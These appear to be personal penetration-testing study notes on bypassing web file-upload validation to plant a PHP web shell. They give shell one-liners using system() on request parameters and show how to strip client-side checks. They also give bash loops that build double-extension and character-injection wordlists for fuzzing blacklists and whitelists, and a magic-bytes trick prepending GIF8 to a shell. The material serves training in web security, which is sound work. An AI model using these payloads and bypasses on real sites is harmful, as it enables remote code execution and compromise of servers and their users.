No validation filters
1. Fuzz the extension, see if php, asp, or aspx etc (or use Wappalyzer)
2. Upload the shell in that extension 


## Client-Side Validation Bypass
to bypass
1. modify upload request 
2. manipulate front-end code to disable these validations

### Modify upload request
in burp, you just have to modify the filename to shell.php and the content to `<?php system($_REQUEST['CMD']); ?>` `<?php system($_GET["cmd"]); ?>`

### Modify front-end code
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

in the accept="" just add in ur file extension and then remove the javascript function `checkFile(this)` 

## Server-Side Validation Bypass
### Blacklist Filter 
say there is like a blacklist of `php, php7, phps` etc 
do an extension fuzzing to see what extensions it allows 

intercept the request with burp, change the filename in the request to fuzz the common php extends in PayloadsAllTheThings then sort it by length to see what is approved 

** rmb to disable URL-encode these characters in the bottom right

then just change the extension to the approved extension and then upload it and then go to the url 



### Whitelist Filter
generally more secure than blacklist 

if it uses regex -> we can try to have double extensions
```
black=('.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm')
white=(".png" ".jpg" ".jpeg")

for b in "${black[@]}"; do
	for w in "${white[@]}"; do
		echo "shell$b$w" >> nwl.txt
		echo "shell$w$b" >> nwl.txt
	done
done
```

can try character injection also

try fuzzing with this generated wordlists
```

exts=('.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm')
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
    for ext in "${exts[@]}"; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

```

## Type Filters
filtering using Content-Type Header or File Content 

```
/usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
```
you might also just want to grep the things that start with `image/` and create a new file 

go to burp intercepter and try this 

### Magic Bytes 
add the allowed magic bytes at the start of the content to make them believe it should be allowed
```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

![](Assets/Pasted%20image%2020250705102934.png)